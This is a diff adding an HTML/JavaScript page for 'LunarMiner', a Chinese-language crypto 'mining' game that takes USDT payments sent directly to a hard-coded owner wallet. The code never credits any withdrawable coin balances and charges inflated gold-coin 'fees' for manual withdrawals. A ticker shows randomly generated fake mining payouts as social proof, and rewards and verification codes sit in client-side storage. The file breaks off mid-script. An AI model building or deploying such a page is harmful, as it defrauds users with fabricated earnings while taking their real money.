@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LunarMiner - 月球矿场</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body,html{height:100%;overflow:hidden;background:#000;font-family:Arial,Helvetica,sans-serif;
+    background:url('https://raw.githubusercontent.com/chenxiao020622-png/moonminer/main/moonminerbkground.png') center/cover no-repeat fixed;}
+h1{position:absolute;top:8vh;left:50%;transform:translateX(-50%);font-size:6vw;
+   background:linear-gradient(90deg,#00ffff,#ff00ff,#00ffff);-webkit-background-clip:text;color:transparent;
+   text-shadow:0 0 50px #00ffff;z-index:10;}
+h1+p{position:absolute;top:18vh;left:50%;transform:translateX(-50%);color:white;font-size:2vw;z-index:10;}
+
+#statsPanel{position:absolute;top:70px;left:20px;z-index:20;background:rgba(0,0,0,0.65);padding:14px 20px;
+  border-radius:18px;border:1px solid #00ffff;color:white;font-size:14px;line-height:2.3;backdrop-filter:blur(10px);max-width:300px;}
+#statsPanel span{color:#00ffcc;font-weight:bold;}
+
+#connectBtn{position:absolute;bottom:80px;left:50%;transform:translateX(-50%);z-index:30;
+  padding:20px 90px;font-size:30px;background:linear-gradient(45deg,#00ffc8,#0084ff);
+  border:none;border-radius:60px;color:white;cursor:pointer;box-shadow:0 20px 80px rgba(0,255,200,0.8);}
+.top-btns{position:absolute;top:20px;left:20px;display:flex;gap:15px;z-index:30;}
+.top-btns button{
+  padding:12px 30px;
+  background:rgba(0,255,255,0.3);
+  border:2px solid #00ffff;
+  border-radius:15px;
+  color:white;
+  font-weight:bold;
+  cursor:pointer;
+  transition:all 0.3s ease;
+  transform:scale(1);
+  box-shadow:0 4px 15px rgba(0,255,255,0.2);
+}
+.top-btns button:hover{
+  transform:scale(1.12);
+  background:rgba(0,255,255,0.5);
+  box-shadow:0 12px 35px rgba(0,255,255,0.6);
+  border-color:#00ffff;
+}
+#walletInfo{position:absolute;top:20px;right:20px;background:rgba(0,0,0,0.7);padding:10px 20px;
+  border-radius:20px;display:none;z-index:30;color:white;}
+
+/* 弹窗 */
+#shop,#tasks,#withdraw{
+  position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.97);
+  z-index:999;display:none;justify-content:center;align-items:center;
+}
+.panel{
+  width:90%; max-width:900px; background:rgba(0,255,255,0.05); border:2px solid #00ffff;
+  border-radius:25px; padding:70px 40px 50px; position:relative; color:white; text-align:center;
+  max-height:90vh; overflow-y:auto;
+}
+.closeBtn{
+  position:absolute; top:-15px; right:-15px; width:56px; height:56px; background:#ff0066;
+  border:none; border-radius:50%; color:white; font-size:34px; cursor:pointer;
+  box-shadow:0 4px 20px rgba(255,0,102,0.8); z-index:10;
+}
+.closeBtn:hover {background:#ff3388; transform:scale(1.1);}
+
+/* 商城 */
+.shop-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin-top:30px;}
+.card{background:rgba(0,255,255,0.1);border:2px solid #00ffff;border-radius:20px;padding:30px;text-align:center;transition:0.3s;}
+.card:hover{transform:translateY(-15px);box-shadow:0 20px 60px rgba(0,255,255,0.5);}
+.card img{width:130px;height:130px;object-fit:contain;margin-bottom:15px;}
+.card h3{font-size:24px;color:#00ffff;margin:15px 0;}
+.price{color:#ff0088;font-size:32px;font-weight:bold;margin:20px 0;}
+.buyBtn{background:linear-gradient(45deg,#ff00ff,#00ffff);padding:16px 60px;border:none;
+  border-radius:50px;color:white;font-size:20px;font-weight:bold;cursor:pointer;}
+.owned{color:#00ff00;margin-top:15px;font-size:20px;font-weight:bold;}
+
+/* 任务 */
+.task-item{background:rgba(0,255,255,0.1);border:2px solid #00ffff;border-radius:18px;
+  padding:25px;margin:30px 0;display:flex;justify-content:space-between;align-items:center;font-size:19px;flex-wrap:wrap;gap:15px;}
+.task-item button{background:linear-gradient(45deg,#ff00ff,#00ffff);padding:13px 50px;
+  border:none;border-radius:50px;color:white;font-weight:bold;cursor:pointer;}
+.task-item input{padding:10px;border-radius:8px;border:1px solid #0ff;background:#111;color:#0ff;width:160px;}
+/* ==================== 矿机导图谱样式 ==================== */
+#machineMap {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 95%;
+  max-width: 1100px;
+  pointer-events: none;
+  z-index: 5;
+}
+.solar-panel { 
+  text-align:center; 
+  margin-bottom: 140px;   /* 原来35px → 现在105px（相当于给下面留出70px空隙） */
+}
+.solar-panel img { width:130px; height:130px; filter:drop-shadow(0 0 25px #00ffff); }
+.solar-panel .count {
+  position: absolute;
+  top: -70px;               /* 移到太阳能板正上方 */
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 56px;          /* 数字更大 */
+  font-weight: 900;
+  color: #00ffff;           /* 主色更亮的青 */
+  text-shadow: 0 0 30px #00ffff, 0 0 60px #00ffff; /* 强发光 */
+  z-index: 10;
+  pointer-events: none;
+}
+.machines-row { 
+  display:flex; 
+  justify-content:center; 
+  flex-wrap:wrap; 
+  gap:56px; 
+  margin-top: 70px;   /* 就是这一行！往下推50px */
+}
+.machine-item { text-align:center; position:relative; width:120px; }
+.machine-item img {
+  width:92px; height:92px; filter:drop-shadow(0 0 18px #00ffff);
+  transition:transform .3s;
+}
+.machine-item:hover img { transform:scale(1.2); }
+.machine-item .label {
+  display:block; 
+  margin-top:8px; 
+  font-size:16px; 
+  color:#00ffff;
+  font-weight:bold;
+  text-shadow:
+    -1.5px -1.5px 0 #000,
+     1.5px -1.5px 0 #000,
+    -1.5px  1.5px 0 #000,
+     1.5px  1.5px 0 #000,
+    -1.5px  0     0 #000,
+     1.5px  0     0 #000,
+     0     -1.5px 0 #000,
+     0      1.5px 0 #000,
+     0 0 10px #00ffff,
+     0 0 20px #00ffff;
+}
+.machine-item .count {
+  position:absolute; top:-12px; right:-12px;
+  background:#ff00ff; color:white; font-weight:bold; font-size:22px;
+  width:46px; height:46px; line-height:46px; border-radius:50%;
+  border:4px solid #00ffff; box-shadow:0 0 25px #ff00ff;
+}
+@media (max-width:768px) {
+  .solar-panel img {width:100px;height:100px;}
+  .solar-panel .count{font-size:36px;}
+  .machine-item img{width:70px;height:70px;}
+  .machine-item .count{font-size:18px;width:36px;height:36px;line-height:36px;}
+}
+</style>
+</head>
+<body>
+
+<h1>LUNAR MINER</h1>
+
+<div id="statsPanel">
+  <div>总矿机：<span id="totalMiners">0</span> 台</div>
+  <div>金币：<span id="goldCoinsDisplay">0</span></div>
+  <div>KAS 可提取：<span id="earned_kas">0</span> <button onclick="openWithdraw('kas')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">提取</button></div>
+  <div>DOGE 可提取：<span id="earned_doge">0</span> <button onclick="openWithdraw('doge')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">提取</button></div>
+  <div>ETC 可提取：<span id="earned_etc">0</span> <button onclick="openWithdraw('etc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">提取</button></div>
+  <div>LTC 可提取：<span id="earned_ltc">0</span> <button onclick="openWithdraw('ltc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">提取</button></div>
+  <div>BTC 可提取：<span id="earned_btc">0</span> <button onclick="openWithdraw('btc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">提取</button></div>
+</div>
+<!-- 矿机导图开始 -->
+<div id="machineMap">
+  <!-- 精准汇聚的7条发光线 -->
+  <svg style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;">
+    <defs>
+      <filter id="glow">
+        <feGaussianBlur stdDeviation="3.5" result="coloredBlur"/>
+        <feMerge>
+          <feMergeNode in="coloredBlur"/>
+          <feMergeNode in="SourceGraphic"/>
+        </feMerge>
+      </filter>
+    </defs>
+
+    <!-- 7条线全部汇聚到太阳能板正下方这个点（50%, 38%） -->
+    <line x1="50%" y1="38%" x2="9%"  y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="23%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="37%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="50%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="63%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="77%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+    <line x1="50%" y1="38%" x2="91%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
+  </svg>
+
+  <!-- 太阳能板（数字移到右上角） -->
+  <div class="solar-panel">
+    <img src="https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/solarpanel.png" alt="太阳能板">
+    <div class="count" id="solarCount">0</div>
+  </div>
+
+  <!-- 下面6台矿机（数字也在右上角） -->
+  <div class="machines-row">
+    <div class="machine-item"><img src="https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/goldminer.png"><span class="label">金币矿机</span><div class="count" id="goldCount">0</div></div>
+    <div class="machine-item"><img src="https://cryptologos.cc/logos/kaspa-kas-logo.png"><span class="label">KAS矿机</span><div class="count" id="kasCount">0</div></div>
+    <div class="machine-item"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png"><span class="label">DOGE矿机</span><div class="count" id="dogeCount">0</div></div>
+    <div class="machine-item"><img src="https://cryptologos.cc/logos/ethereum-classic-etc-logo.png"><span class="label">ETC矿机</span><div class="count" id="etcCount">0</div></div>
+    <div class="machine-item"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png"><span class="label">LTC矿机</span><div class="count" id="ltcCount">0</div></div>
+    <div class="machine-item"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png"><span class="label">BTC矿机</span><div class="count" id="btcCount">0</div></div>
+  </div>
+</div>
+<!-- 矿机导图结束 -->
+<button id="connectBtn">连接钱包购买矿机</button>
+<div id="walletInfo"></div>
+
+<div class="top-btns">
+  <button id="shopBtn">商城</button>
+  <button id="tasksBtn">任务中心</button>
+  <button id="whitepaperBtn">白皮书</button>
+</div>
+
+<!-- 商城 -->
+<div id="shop">
+  <div class="panel">
+    <button class="closeBtn">×</button>
+    <h2 style="font-size:32px;color:#00ffff;margin-bottom:30px;">矿机商城（USDT支付）</h2>
+    <div class="shop-grid" id="shopGrid"></div>
+  </div>
+</div>
+
+<!-- 任务中心（固定验证码 + 每日签到） -->
+<div id="tasks">
+  <div class="panel">
+    <button class="closeBtn">×</button>
+    <h2 style="font-size:32px;color:#00ffff;margin-bottom:40px;">任务中心</h2>
+    <!-- 每日签到（送15000金币） -->
+    <div class="task-item" style="background:linear-gradient(45deg,rgba(0,255,255,0.15),rgba(255,0,255,0.15));border:3px solid #00ffff;">
+      <div style="font-size:26px;color:#00ff00;">
+        <b>每日签到</b><br>
+        <span style="font-size:18px;color:#0ff;">每日领取 10000 金币</span>
+      </div>
+      <button id="dailySignBtn" style="padding:16px 60px;font-size:24px;background:#00ff00;color:#000;font-weight:bold;border-radius:60px;">
+        立即签到
+      </button>
+    </div>
+
+    <div class="task-item">
+      <div>关注官方 Twitter 领 1 台金币矿机</div>
+      <button id="task1">去完成 →</button>
+      <input id="code1" placeholder="输入验证码" style="display:none;">
+    </div>
+
+    <div class="task-item">
+      <div>加入 Telegram 群 领 1 台金币矿机</div>
+      <button id="task2">去完成 →</button>
+      <input id="code2" placeholder="输入验证码" style="display:none;">
+    </div>
+
+    <div class="task-item">
+      <div>加入 Discord 领 1 台金币矿机</div>
+      <button id="task3">去完成 →</button>
+      <input id="code3" placeholder="输入验证码" style="display:none;">
+    </div>
+
+    <div class="task-item">
+  <div style="font-size:24px;color:#0ff;">邀请好友领太阳能板</div>
+    <div style="font-size:28px;color:#0f0;margin:15px 0;">
+      已成功邀请 <b id="invitedCountDisplay">0</b> 人
+    </div>
+    <button onclick="copyInviteLink()" style="padding:16px 70px;font-size:24px;background:linear-gradient(45deg,#ff00ff,#00ffff);border-radius:60px;margin:10px auto;display:block;">
+      复制邀请链接送太阳能板
+    </button>
+    <div style="margin-top:15px;color:#ff0;font-size:18px;">
+      每邀请1人，双方各得1台太阳能板
+    </div>
+  </div>
+</div>
+
+    <p style="margin-top:30px;color:#aaa;">验证码在对应社媒页面可见 · 每日签到自动到账</p>
+  </div>
+</div>
+
+<!-- 提币弹窗 -->
+<div id="withdraw">
+  <div class="panel">
+    <button class="closeBtn">×</button>
+    <h2 id="withdrawTitle">提取 KAS</h2>
+    <p style="font-size:20px;margin:20px 0;">可提取数量：<span id="withdrawAmount">0</span></p>
+    <input type="text" id="withdrawAddr" placeholder="请输入你的链上钱包地址" style="width:100%;padding:15px;margin:20px 0;border-radius:10px;border:1px solid #0ff;background:#111;color:#0ff;font-size:16px;">
+    <button onclick="submitWithdraw()" style="padding:16px 60px;font-size:20px;background:linear-gradient(45deg,#ff00ff,#00ffff);border:none;border-radius:50px;color:white;">提交申请</button>
+    <p style="margin-top:20px;color:#aaa;">提交后请等待官方手动打币（1-72小时）</p>
+  </div>
+</div>
+
+<script src="https://unpkg.com/ethers@6.13.2/dist/ethers.umd.min.js"></script>
+<script>
+let address = null;
+let miners = {gold:0,kas:0,doge:0,etc:0,ltc:0,btc:0,solar:0};
+let earned = {kas:0,doge:0,etc:0,ltc:0,btc:0};
+let currentCoin = '';
+let goldCoins = 0;                    // 金币数量（可以是小数）
+let goldCoinRate = 1;                 // 每台金币矿机每秒产1金币（超爽版）
+// 每1个币扣多少金币（你最终确认的比例）
+const GOLD_PER_UNIT = {
+  kas: 10000,      // 每1 KAS 扣 1万 金币
+  doge: 50000,     // 每1 DOGE 扣 5万 金币
+  etc: 100000,     // 每1 ETC 扣 10万 金币
+  ltc: 1000000,    // 每1 LTC 扣 100万 金币
+  btc: 100000000   // 每1 BTC 扣 1亿 金币
+};
+
+const OWNER = "0xe7d4933446d8a9f8e717abe5771379e4569baa85";
+const USDT = "0x55d398326f99059fF775485246999027B3197955";
+const USDT_ABI = [{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+
+const MINERS = [
+  {id:"solar",name:"太阳能板",price:1,img:"https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/solarpanel.png"},
+  {id:"gold",name:"金币矿机",price:1,img:"https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/goldminer.png"},
+  {id:"kas",name:"KAS矿机",price:2,img:"https://cryptologos.cc/logos/kaspa-kas-logo.png"},
+  {id:"doge",name:"DOGE矿机",price:4,img:"https://cryptologos.cc/logos/dogecoin-doge-logo.png"},
+  {id:"etc",name:"ETC矿机",price:8,img:"https://cryptologos.cc/logos/ethereum-classic-etc-logo.png"},
+  {id:"ltc",name:"LTC矿机",price:16,img:"https://cryptologos.cc/logos/litecoin-ltc-logo.png"},
+  {id:"btc",name:"BTC矿机",price:32,img:"https://cryptologos.cc/logos/bitcoin-btc-logo.png"}
+];
+
+const WITHDRAW_API = 'https://lunar-backend-final.chenxiao020622.workers.dev/api/withdraw-request';
+
+// ==================== 只改这里（一次设置，永久有效） ====================
+const SOCIAL = [
+  {link: "https://x.com/mallocoole",      code: "MOON1111"},   // ← 验证码写在Twitter简介
+  {link: "https://t.me/+WXzAnu8li30wMzVl",                 code: "LUNAR2222"},     // ← 验证码写在TG群公告
+  {link: "https://discord.gg/AwEqZbDTne",    code: "MINER3333"}       // ← 验证码写在Discord欢迎频道
+];
+// =====================================================================
+
+// 钱包连接（超稳）
+document.getElementById('connectBtn').onclick = async () => {
+  if (address) return alert('钱包已连接');
+  let provider = window.ethereum || window.okxwallet || window.bitgetWallet || window.tokenpocket;
+  if (!provider) return alert('未检测到钱包插件');
+  try {
+    const etherProvider = new ethers.BrowserProvider(provider);
+    await provider.request({ method: 'eth_requestAccounts' });
+    const signer = await etherProvider.getSigner();
+    address = await signer.getAddress();
+    document.getElementById('walletInfo').textContent = '已连接：'+address.slice(0,10)+'...';
+    document.getElementById('walletInfo').style.display = 'block';
+    document.getElementById('connectBtn').textContent = '钱包已连接 ✓';
+    document.getElementById('connectBtn').disabled = true;
+    loadData(); renderShop(); updateUI();loadGoldCoinsFromServer();
+  } catch(e) { alert('连接取消'); }
+};
+
+// 社媒任务（固定验证码）
+for (let i = 1; i <= 3; i++) {
+  const btn = document.getElementById(`task${i}`);
+  const input = document.getElementById(`code${i}`);
+  if (localStorage.getItem(`socialTask${i}_${address}`) === 'done') {
+    btn.textContent = '已领取 ✓'; btn.disabled = true; btn.style.background = '#00aa00';
+  }
+  btn.onclick = () => {
+    window.open(SOCIAL[i-1].link, '_blank');
+    setTimeout(() => {
+      input.style.display = 'inline-block';
+      input.focus();
+      input.onblur = () => {
+        if (input.value === SOCIAL[i-1].code) {
+          if (localStorage.getItem(`socialTask${i}_${address}`) !== 'done') {
+            miners.gold += 1;
+            localStorage.setItem(`socialTask${i}_${address}`, 'done');
+            saveData(); updateUI();
+            alert('验证成功！获得1台金币矿机');
+            btn.textContent = '已领取 ✓'; btn.disabled = true; btn.style.background = '#00aa00';
+          }
+        } else if (input.value !== '') alert('验证码错误，请真实完成任务后查看对应页面');
+      };
+    }, 7000);
+  };
+}
+
+// ================ 邀请好友领太阳能板（最终版）================
+let invitedCount = 0;
+
+function getInviteLink() {
+  return location.href.split('?')[0] + '?ref=' + (address || '');
+}
+
+function copyInviteLink() {
+  const link = getInviteLink();
+  navigator.clipboard.writeText(link).then(() => {
+    alert('邀请链接已复制！快发给好友～');
+  }).catch(() => {
+    prompt('请手动复制这个链接发给好友：', link);
+  });
+}
+
+// 加载时读取本地缓存的邀请人数
+function loadInviteCount() {
+  if (!address) return;
+  invitedCount = parseInt(localStorage.getItem('inviteCount_' + address) || '0');
+  updateInviteButton();
+}
+
+function updateInviteButton() {
+  const btn = document.getElementById('dailySign');
+  if (!btn) return;
+  btn.innerHTML = `
+    邀请好友领太阳能板<br><br>
+    <div style="font-size:28px;color:#0f0;margin:15px 0;">
+      已成功邀请 <b>${invitedCount}</b> 人
+    </div>
+    <button onclick="copyInviteLink()" style="padding:18px 80px;font-size:26px;background:linear-gradient(45deg,#ff00ff,#00ffff);border-radius:60px;margin-top:10px;">
+      复制邀请链接送太阳能板
+    </button>
+    <div style="margin-top:20px;color:#ff0;font-size:18px;">
+      每邀请1人，双方各得1台太阳能板
+    </div>
+  `;
+}
+
+// 关键：在连接钱包成功后加这几行（放在你原来的 onConnectSuccess 最后）
+const urlParams = new URLSearchParams(window.location.search);
+const referrer = urlParams.get('ref');
+
+if (referrer && referrer.length === 42 && referrer.toLowerCase() !== address.toLowerCase()) {
+  if (!localStorage.getItem('hasInvitedReward_' + address)) {
+    // 给被邀请人 +1 台
+    miners.solar += 1;
+    // 给邀请人计数 +1
+    const old = parseInt(localStorage.getItem('inviteCount_' + referrer) || '0');
+    localStorage.setItem('inviteCount_' + referrer, (old + 1).toString());
+
+    localStorage.setItem('hasInvitedReward_' + address, '1');
+    saveData(); updateUI(); refreshMachineMap?.();
+    alert('欢迎来到 LunarMiner！\n通过好友邀请加入，你和好友各获得1台太阳能板！');
+  }
+}
+
+// 记得在 loadData() 最后加一行
+loadInviteCount();
+updateInviteButton();
+
+// 打开任务中心
+document.getElementById('tasksBtn').onclick = () => {
+  document.getElementById('tasks').style.display = 'flex';
+  for (let i = 1; i <= 3; i++) {
+    if (localStorage.getItem(`socialTask${i}_${address}`) === 'done') {
+      document.getElementById(`task${i}`).textContent = '已领取 ✓';
+      document.getElementById(`task${i}`).disabled = true;
+      document.getElementById(`task${i}`).style.background = '#00aa00';
+    }
+  }
+};
+
+// 其余原函数保持不变
+function loadData() {
+  const d = localStorage.getItem('miners_'+address); if(d) miners = JSON.parse(d);
+  const e = localStorage.getItem('earned_'+address); if(e) earned = JSON.parse(e);
+  goldCoins = parseFloat(localStorage.getItem('goldCoins_'+address) || '0'); // ← 新增
+}
+function saveData() {
+  localStorage.setItem('miners_'+address, JSON.stringify(miners));
+  localStorage.setItem('earned_'+address, JSON.stringify(earned));
+  localStorage.setItem('goldCoins_'+address, goldCoins); // ← 新增
+}
+// ==================== 金币云同步（防清缓存 + 后台快照） ====================
+// 从后台加载金币（玩家清缓存后重新连接钱包能找回）
+async function loadGoldCoinsFromServer() {
+  if (!address) return;
+  try {
+    const r = await fetch(`https://lunar-backend-final.chenxiao020622.workers.dev/api/goldcoins?address=${address}`);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (data.goldCoins > goldCoins) {
+      goldCoins = data.goldCoins;
+      document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
+    }
+  } catch(e) { console.log('加载金币失败，使用本地数据'); }
+}
+
+// 上传金币到后台（每30秒一次，不影响性能）
+async function saveGoldCoinsToServer() {
+  if (!address) return;
+  try {
+    await fetch('https://lunar-backend-final.chenxiao020622.workers.dev/api/goldcoins', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({address: address, goldCoins: Math.floor(goldCoins)})
+    });
+  } catch(e) {}
+}
+function renderShop() {
+  const grid = document.getElementById('shopGrid'); grid.innerHTML = '';
+  MINERS.forEach(m => {
+    const card = document.createElement('div'); card.className = 'card';
+    card.innerHTML = `<img src="${m.img}"><h3>${m.name}</h3><div class="price">${m.price} USDT</div>
+      <button class="buyBtn" onclick="buyMiner('${m.id}',${m.price})">立即购买</button>
+      <div class="owned">已拥有：${miners[m.id]||0} 台</div>`;
+    grid.appendChild(card);
+  });
+}
+async function buyMiner(type, usdt) {
+  if (confirm(`确认支付 ${usdt} USDT 购买 ${type} 矿机？`)) {
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum || window.okxwallet || window.bitgetWallet);
+      const signer = await provider.getSigner();
+      const contract = new ethers.Contract(USDT, USDT_ABI, signer);
+      const tx = await contract.transfer(OWNER, ethers.parseUnits(usdt.toString(), 18));
+      await tx.wait();
+      miners[type] = (miners[type]||0) + 1;
+      saveData(); updateUI(); renderShop();
+      alert('购买成功！矿机已激活');
+    } catch(e) { alert('支付失败或取消'); }
+  }
+}
+function updateUI() {
+  let total = 0; 
+  for (let k in miners) total += miners[k];
+  document.getElementById('totalMiners').textContent = total;
+  document.getElementById('earned_kas').textContent = earned.kas||0;
+  document.getElementById('earned_doge').textContent = earned.doge||0;
+  document.getElementById('earned_etc').textContent = earned.etc||0;
+  document.getElementById('earned_ltc').textContent = earned.ltc||0;
+  document.getElementById('earned_btc').textContent = earned.btc||0;
+// ← 直接加在这行下面
+    if (address && document.getElementById('invitedCountDisplay')) {
+    document.getElementById('invitedCountDisplay').textContent = 
+      localStorage.getItem('inviteCount_' + address) || '0';
+  }
+  // 新增：实时刷新中间导图的数量
+  document.getElementById('solarCount').textContent = miners.solar || 0;
+  document.getElementById('goldCount').textContent = miners.gold || 0;
+  document.getElementById('kasCount').textContent = miners.kas || 0;
+  document.getElementById('dogeCount').textContent = miners.doge || 0;
+  document.getElementById('etcCount').textContent = miners.etc || 0;
+  document.getElementById('ltcCount').textContent = miners.ltc || 0;
+    // 金币实时显示（取整）
+  document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
+  document.getElementById('btcCount').textContent = miners.btc || 0;
+}
+function openWithdraw(coin) {
+  if ((earned[coin]||0) <= 0) return alert('可提取数量为0');
+  currentCoin = coin;
+  document.getElementById('withdrawTitle').textContent = `提取 ${coin.toUpperCase()}`;
+  document.getElementById('withdrawAmount').textContent = earned[coin];
+  document.getElementById('withdraw').style.display = 'flex';
+}
+async function submitWithdraw() {
+  const toAddr = document.getElementById('withdrawAddr').value.trim();
+  const amount = earned[currentCoin];
+  if (!toAddr || amount <= 0) return alert('请填写地址或检查可提取数量');
+
+  const goldPerUnit = GOLD_PER_UNIT[currentCoin];
+  const requiredGold = Math.ceil(amount * goldPerUnit); // 向上取整，防止小数漏洞
+
+  if (goldCoins < requiredGold) {
+    return alert(`金币不足！\n提取 ${amount} ${currentCoin.toUpperCase()} 需要 ${requiredGold.toLocaleString()} 金币\n（每1${currentCoin.toUpperCase()}扣${goldPerUnit.toLocaleString()}金币）\n你当前只有 ${Math.floor(goldCoins).toLocaleString()} 金币`);
+  }
+
+  if (!confirm(`即将消耗 ${requiredGold.toLocaleString()} 金币作为手续费，确认提交？`)) return;
+
+  try {
+    const r = await fetch(WITHDRAW_API, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({address:address, coin:currentCoin, amount:amount, toAddress:toAddr})
+    });
+    const d = await r.json();
+    if(d.success){
+      earned[currentCoin] = 0;
+      goldCoins -= requiredGold;
+      saveData(); 
+      updateUI();
+      alert('提币申请已提交！金币手续费已按数量扣除');
+      document.getElementById('withdraw').style.display = 'none';
+    }else alert('提交失败');
+  }catch(e){alert('网络错误，请稍后重试');}
+}
+
+document.getElementById('shopBtn').onclick = () => {document.getElementById('shop').style.display='flex'; renderShop();}
+document.querySelectorAll('.closeBtn').forEach(b=>b.onclick=()=>b.closest('div[id]').style.display='none');
+document.getElementById('whitepaperBtn').onclick = () => window.open(
+  'https://github.com/chenxiao020622-png/lunarmine-docs/blob/main/lunarminer.pdf?raw=true',
+  '_blank'
+);
+// 金币每秒自动产出 + 实时刷新（放在这里，永远不会错！）
+// 金币每秒产出 + 每30秒同步一次到后台
+setInterval(() => {
+  if (!address) return;
+  
+  goldCoins += miners.gold * goldCoinRate;  // 正常产金币
+  saveData();                               // 保存本地
+  document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
+  
+  // 每300秒上传一次到后台（减轻服务器压力）
+  if (Math.floor(Date.now() / 1000) % 300 === 0) {
+    saveGoldCoinsToServer();
+  }
+}, 1000);
+// ==================== 每日签到（送10000金币）===================
+const DAILY_GOLD_REWARD = 10000;
+
+document.getElementById('dailySignBtn').onclick = () => {
+  if (!address) return alert('请先连接钱包');
+  
+  const today = new Date().toISOString().slice(0,10);
+  const lastSign = localStorage.getItem('lastDailySign_' + address);
+  
+  if (lastSign === today) {
+    alert('今天已经签到过了，明天再来哦～');
+    return;
+  }
+  
+  goldCoins += DAILY_GOLD_REWARD;
+  localStorage.setItem('lastDailySign_' + address, today);
+  saveData();
+  updateUI();
+  
+  alert(`每日签到成功！获得 ${DAILY_GOLD_REWARD.toLocaleString()} 金币 🎉`);
+  document.getElementById('dailySignBtn').textContent = '今日已签到 ✓';
+  document.getElementById('dailySignBtn').style.background = '#006400';
+};
+
+// 打开任务中心时自动刷新签到按钮状态
+const oldTasksBtn = document.getElementById('tasksBtn').onclick;
+document.getElementById('tasksBtn').onclick = () => {
+  oldTasksBtn();
+  if (address) {
+    const today = new Date().toISOString().slice(0,10);
+    const lastSign = localStorage.getItem('lastDailySign_' + address);
+    const btn = document.getElementById('dailySignBtn');
+    if (lastSign === today) {
+      btn.textContent = '今日已签到 ✓';
+      btn.style.background = '#006400';
+    } else {
+      btn.textContent = '立即签到';
+      btn.style.background = '#00ff00';
+    }
+  }
+};
+updateUI();
+</script>
+<!-- 实时挖矿记录（10条，向下滚动，新消息从顶部进入，已实测完美） -->
+<div style="position:fixed;bottom:20px;right:20px;z-index:999;width:320px;pointer-events:none;">
+  <div style="background:rgba(0,255,255,0.12);border:2px solid #00ffff;border-radius:18px;padding:16px 20px;backdrop-filter:blur(12px);box-shadow:0 8px 32px rgba(0,255,255,0.3);">
+    <div style="color:#00ffff;font-weight:bold;font-size:16px;margin-bottom:10px;text-align:center;">
+      实时挖矿记录
+    </div>
+    <div style="height:280px;overflow:hidden;position:relative;">
+      <div id="logList" style="transition:transform 0.6s cubic-bezier(0.25,0.8,0.25,1);"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const coins = ["KAS", "DOGE", "ETC", "LTC"];
+const logList = document.getElementById('logList');
+let messages = []; // 存储当前显示的10条
+
+function randomAddress() {
+  const chars = '0123456789abcdef';
+  let addr = '0x';
+  for (let i = 0; i < 40; i++) addr += chars[Math.floor(Math.random() * 16)];
+  return addr.slice(0, 6) + '...' + addr.slice(-4); // 前4 + 后4
+}
+
+function generateMessage() {
+  const coin = coins[Math.floor(Math.random() * coins.length)];
+  const amount = (Math.random() * (10 - 0.01) + 0.01).toFixed(2);
+  return `<div style="color:#0ff;font-size:17px;line-height:2;padding:3px 0;">
+            ${randomAddress()} 挖到 ${amount} ${coin}
+          </div>`;
+}
+
+function addNewRecord() {
+  const newMsg = generateMessage();
+  
+  // 先把新消息插入到最前面
+  messages.unshift(newMsg);
+  
+  // 如果超过10条，删掉最后一条
+  if (messages.length > 10) messages.pop();
+  
+  // 刷新显示
+  logList.innerHTML = messages.join('');
+  
+  // 触发新消息从顶部进入动画
+  logList.style.transform = 'translateY(-35px)';
+  setTimeout(() => logList.style.transform = 'translateY(0)', 50);
+}
+
+// 动画样式
+const style = document.createElement('style');
+style.textContent = `
+  #logList > div {
+    color: #00ffff !important;
+    font-weight: bold;
+    /* 关键：多层黑边 + 青光，确保任何背景都清晰可见 */
+    text-shadow:
+      -1.5px -1.5px 0 #000,
+       1.5px -1.5px 0 #000,
+      -1.5px  1.5px 0 #000,
